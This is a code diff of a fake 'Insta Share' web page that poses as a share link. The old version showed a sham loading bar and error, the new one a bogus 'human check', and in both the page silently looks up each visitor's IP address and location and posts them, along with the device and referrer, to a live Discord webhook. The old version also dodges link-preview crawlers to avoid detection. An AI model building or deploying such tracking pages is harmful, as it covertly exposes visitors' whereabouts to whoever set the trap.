@@ -2,102 +2,71 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Insta Share</title>
+  <title>Insta Share - Human Check</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="robots" content="noindex, nofollow">
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   <style>
     body {
       margin: 0;
-      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
-      background-color: #fafafa;
+      font-family: sans-serif;
+      background: #fafafa;
       display: flex;
-      flex-direction: column;
-      align-items: center;
       justify-content: center;
+      align-items: center;
       height: 100vh;
-      color: #262626;
-    }
-    .loader-container {
+      flex-direction: column;
       text-align: center;
     }
     .logo {
       font-size: 32px;
       font-weight: bold;
-      color: #262626;
       margin-bottom: 20px;
-    }
-    .progress-bar {
-      width: 300px;
-      height: 8px;
-      background-color: #dbdbdb;
-      border-radius: 4px;
-      overflow: hidden;
-      margin: 0 auto 20px;
-    }
-    .progress {
-      width: 0%;
-      height: 100%;
-      background: linear-gradient(90deg, #3897f0, #0057e7);
-      animation: loading 4s linear forwards;
-    }
-    @keyframes loading {
-      0% { width: 0%; }
-      100% { width: 100%; }
+      color: #262626;
     }
     .message {
-      display: none;
-      font-size: 16px;
+      margin-top: 20px;
+      font-size: 14px;
       color: #999;
     }
   </style>
 </head>
 <body>
-  <div class="loader-container">
-    <div class="logo">Insta Share</div>
-    <div class="progress-bar">
-      <div class="progress" id="progress"></div>
-    </div>
-    <div class="message" id="errorMessage">Sorry, we couldn’t reach that page.</div>
-  </div>
+  <div class="logo">Insta Share</div>
+  
+  <div class="g-recaptcha" data-sitekey="6LeTg4ErAAAAAOJ4tpn7E_vvhRyRJZN-3LTvNw22" data-callback="onCaptchaSuccess"></div>
+  
+  <div class="message" id="statusMsg">To avoid bots on our website, please verify you're a human.</div>
 
   <script>
-    function isLikelyBot() {
-      const ua = navigator.userAgent.toLowerCase();
-      return navigator.webdriver ||
-        !ua ||
-        /bot|crawl|spider|preview|fetch|headless|phantom|slurp|facebookexternalhit|discordbot|twitterbot|python|wget|curl/i.test(ua) ||
-        !window.chrome && !window.outerWidth;
-    }
-
-    if (!isLikelyBot()) {
-      const urlParams = new URLSearchParams(window.location.search);
-      const source = urlParams.get('src') || 'unknown';
+    function onCaptchaSuccess(token) {
+      document.getElementById('statusMsg').textContent = '✅ Verified. Logging visit...';
 
       fetch("https://ipinfo.io/json")
         .then(res => res.json())
         .then(ipData => {
           const payload = {
-            content: `📥 New Visitor Logged
+            content: `📥 Verified Visitor Logged
 🌍 IP: ${ipData.ip}
 📍 Location: ${ipData.city}, ${ipData.region}, ${ipData.country}
 🖥️ Device: ${navigator.userAgent}
 🔗 Referrer: ${document.referrer || "none"}
 🕒 Timestamp: ${new Date().toISOString()}
-🎯 Source: ${source}`
+✅ reCAPTCHA passed`
           };
 
-          fetch("https://discord.com/api/webhooks/1393891795800297512/JCqANq-vPmpc1tY4KKCw7BPyfDcAawzduKZheJaORrqdyiPYrgEwZdB3RxRD00869CKY", {
+          return fetch("https://discord.com/api/webhooks/1393891795800297512/JCqANq-vPmpc1tY4KKCw7BPyfDcAawzduKZheJaORrqdyiPYrgEwZdB3RxRD00869CKY", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload)
           });
+        })
+        .then(() => {
+          document.getElementById('statusMsg').textContent = '📬 Logged successfully.';
+        })
+        .catch(() => {
+          document.getElementById('statusMsg').textContent = '⚠️ Something went wrong.';
         });
     }
-
-    // Show fake error after loading bar
-    setTimeout(() => {
-      document.getElementById('errorMessage').style.display = 'block';
-    }, 4200);
   </script>
 </body>
 </html>
